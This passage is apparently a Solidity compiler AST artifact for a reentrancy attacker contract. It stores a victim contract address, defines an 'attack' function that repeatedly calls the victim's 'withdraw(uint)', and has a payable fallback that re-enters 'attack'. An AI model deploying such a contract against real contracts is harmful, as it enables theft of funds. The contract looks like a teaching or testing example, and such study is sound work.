												"name": "_victimContractAddress",
												"nameLocation": "187:22:0",
												"nodeType": "VariableDeclaration",
												"scope": 16,
												"src": "179:30:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 7,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "179:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "178:32:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "219:0:0"
									},
									"scope": 44,
									"src": "166:120:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 35,
										"nodeType": "Block",
										"src": "321:165:0",
										"statements": [
											{
												"body": {
													"id": 33,
													"nodeType": "Block",
													"src": "375:104:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"hexValue": "77697468647261772875696e7429",
																				"id": 28,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "439:16:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_8ba145622f34537cd34250893bdfcf5d32d8f9b6d688b3406fa3127952ad2f05",
																					"typeString": "literal_string \"withdraw(uint)\""
																				},
																				"value": "withdraw(uint)"
																			},
																			{
																				"id": 29,
																				"name": "s_amount",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 6,
																				"src": "457:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_8ba145622f34537cd34250893bdfcf5d32d8f9b6d688b3406fa3127952ad2f05",
																					"typeString": "literal_string \"withdraw(uint)\""
																				},
																				{
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			],
																			"expression": {
																				"id": 26,
																				"name": "abi",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967295,
																				"src": "415:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_abi",
																					"typeString": "abi"
																				}
																			},
																			"id": 27,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"memberName": "encodeWithSignature",
																			"nodeType": "MemberAccess",
																			"src": "415:23:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																				"typeString": "function (string memory) pure returns (bytes memory)"
																			}
																		},
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "415:51:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"expression": {
																		"id": 23,
																		"name": "s_victimContractAddress",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 3,
																		"src": "386:23:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 25,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "call",
																	"nodeType": "MemberAccess",
																	"src": "386:28:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																		"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																	}
																},
																"id": 31,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "386:81:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"id": 32,
															"nodeType": "ExpressionStatement",
															"src": "386:81:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"expression": {
															"id": 19,
															"name": "s_victimContractAddress",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 3,
															"src": "338:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 20,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balance",
														"nodeType": "MemberAccess",
														"src": "338:31:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"hexValue": "30",
														"id": 21,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "373:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "338:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 34,
												"nodeType": "WhileStatement",
												"src": "332:147:0"
											}
										]
									},
									"id": 36,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nameLocation": "303:6:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 17,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "309:2:0"
									},
									"returnParameters": {
										"id": 18,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "321:0:0"
									},
									"scope": 44,
									"src": "294:192:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 42,
										"nodeType": "Block",
										"src": "522:27:0",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 39,
														"name": "attack",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 36,
														"src": "533:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
															"typeString": "function ()"
														}
													},
													"id": 40,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "533:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 41,
												"nodeType": "ExpressionStatement",
												"src": "533:8:0"
											}
										]
									},
									"id": 43,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 37,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "502:2:0"
									},
									"returnParameters": {
										"id": 38,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "522:0:0"
									},
									"scope": 44,
									"src": "494:55:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 45,
							"src": "60:492:0",
							"usedErrors": []
						}
					],
					"src": "33:519:0"
				},
				"id": 0
			}
		}
	}
}